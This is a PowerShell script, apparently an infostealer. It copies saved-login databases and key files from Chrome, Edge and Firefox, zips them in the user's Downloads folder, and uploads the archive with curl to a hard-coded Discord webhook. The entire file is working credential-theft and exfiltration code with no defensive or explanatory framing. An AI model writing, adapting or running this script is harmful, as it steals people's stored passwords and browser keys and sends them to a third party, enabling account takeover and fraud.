function Collect-Credentials {
    $chromeLoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
	$chromeLoginData2 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    $firefoxProfilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    $firefoxLoginData = "$firefoxProfilePath\*\logins.json"
    $edgeLoginData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    $outputPath = "C:\Users\$env:UserName\Downloads\TEST\credential.zip"  # Update the output path to C:\temp
    # Create a temporary directory to store the login data files

	New-Item -Path "C:\Users\$env:UserName\Downloads\" -Name "TEST" -ItemType Directory
	$dir = "C:\Users\$env:UserName\Downloads\TEST\"
    $tempDir = New-Item -ItemType Directory -Path (Join-Path $env:TEMP "CredentialTemp") -Force

    try {
        # Copy Chrome login data
        Copy-Item -Path $chromeLoginData -Destination $tempDir.FullName -Force -ErrorAction Stop
		# Copy Chrome login data
        Copy-Item -Path $chromeLoginData2 -Destination $tempDir.FullName -Force -ErrorAction Stop
        # Copy Edge login data
        Copy-Item -Path $edgeLoginData -Destination $tempDir\edge.FullName -Force -ErrorAction Stop

        # Check if Firefox profiles directory exists
        if (Test-Path -Path $firefoxProfilePath) {
            # Copy Firefox login data
            $firefoxProfiles = Get-ChildItem -Path $firefoxProfilePath -Directory
            foreach ($profile in $firefoxProfiles) {
                $loginDataPath = Join-Path $profile.FullName "logins.json"
                if (Test-Path -Path $loginDataPath) {
                    Copy-Item -Path $loginDataPath -Destination $tempDir.FullName -Force -ErrorAction Stop
                }
            }
        }
        else {
            Write-Host "Firefox profiles directory not found. Skipping Firefox credentials collection." -ForegroundColor Yellow
        }
		# Check if Firefox profiles directory exists
        if (Test-Path -Path $firefoxProfilePath) {
            # Copy Firefox login data
            $firefoxProfiles = Get-ChildItem -Path $firefoxProfilePath -Directory
            foreach ($profile in $firefoxProfiles) {
				$loginDataPath = Join-Path $profile.FullName "key4.db"
                if (Test-Path -Path $loginDataPath) {
                    Copy-Item -Path $loginDataPath -Destination $tempDir.FullName -Force -ErrorAction Stop
                }
            }
        }
        else {
            Write-Host "Firefox profiles directory not found. Skipping Firefox credentials collection." -ForegroundColor Yellow
        }
        # Delete existing zip file if it exists
        if (Test-Path -Path $outputPath -PathType Leaf) {
            Remove-Item -Path $outputPath -Force
        }

        # Zip the collected login data
        Write-Host "Zipping the collected login data..."
        Compress-Archive -Path $tempDir\* -DestinationPath $outputPath -Force

        Write-Host "Credentials collected and zipped successfully at: $outputPath"

        # Return the path to the zip file
        $outputPath
    }
    catch {
        Write-Host "An error occurred while collecting credentials: $_" -ForegroundColor Red
    }
    finally {
        # Clean up the temporary directory
        Remove-Item -Path $tempDir.FullName -Recurse -Force
    }
}

# Call the function to collect and zip the credentials, and store the output path
$zipFilePath = Collect-Credentials

$webhookUrl = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC"  # Replace with your Discord webhook URL

curl.exe -X POST -F 'payload_json={\"username\": \"BinBot\", \"content\": \"\", \"avatar_url\": \"https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif\"}' -F "file=@C:\Users\$env:UserName\Downloads\TEST\credential.zip" $webhookUrl